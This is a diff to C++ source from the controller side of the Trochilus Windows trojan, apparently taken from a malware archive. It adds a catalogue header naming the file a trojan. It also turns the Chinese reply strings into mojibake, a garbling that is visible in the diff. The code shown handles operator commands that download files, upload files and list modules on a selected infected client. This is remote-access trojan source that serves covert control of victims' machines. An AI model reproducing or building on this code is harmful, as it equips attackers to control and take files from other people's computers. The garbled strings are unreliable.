@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "stdafx.h"
 #include "..\master\masterInclude.h"
 #include "CommandManager.h"
@@ -7,7 +18,7 @@
 	tstring __clientid = env.GetClientid();				\
 	if (__clientid.size() == 0)							\
 	{													\
-		replyText = _T("ÇëÏÈÓÃselectÑ¡ÔñÒ»¸ö¿Í»§¶Ë");	\
+		replyText = _T("ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½selectÑ¡ï¿½ï¿½Ò»ï¿½ï¿½ï¿½Í»ï¿½ï¿½ï¿½");	\
 		return FALSE;									\
 	}
 
@@ -100,7 +111,7 @@ BOOL DownloadCmd::Execute( const TStringVector& parts, tstring& replyText, CmdEn
 {
 	if (parts.size() != 3)
 	{
-		replyText = _T("Ê¹ÓÃ·½·¨£ºdownload localfile targetFilename");
+		replyText = _T("Ê¹ï¿½Ã·ï¿½ï¿½ï¿½ï¿½ï¿½download localfile targetFilename");
 		return FALSE;
 	}
 
@@ -124,7 +135,7 @@ BOOL UploadCmd::Execute( const TStringVector& parts, tstring& replyText, CmdEnv&
 {
 	if (parts.size() != 3)
 	{
-		replyText = _T("Ê¹ÓÃ·½·¨£ºupload remotefile localFilename");
+		replyText = _T("Ê¹ï¿½Ã·ï¿½ï¿½ï¿½ï¿½ï¿½upload remotefile localFilename");
 		return FALSE;
 	}
 
@@ -151,13 +162,13 @@ BOOL ListmodCmd::Execute( const TStringVector& parts, tstring& replyText, CmdEnv
 	MyStringList modnameList;
 	if (! ListModules(clientid.c_str(), &modnameList))
 	{
-		replyText = _T("´íÎó:");
+		replyText = _T("ï¿½ï¿½ï¿½ï¿½:");
 		replyText += GetMasterErrorMsg(GetMasterLastError());
 		return FALSE;
 	}
 
 	tostringstream toss;
-	toss << _T("¿ÉÓÃÄ£¿é£º\r\n");
+	toss << _T("ï¿½ï¿½ï¿½ï¿½Ä£ï¿½é£º\r\n");
 	for (DWORD i = 0; i < modnameList.Count(); i++)
 	{
 		toss << _T("\t") << (LPCTSTR)modnameList.At(i) << _T("\r\n");
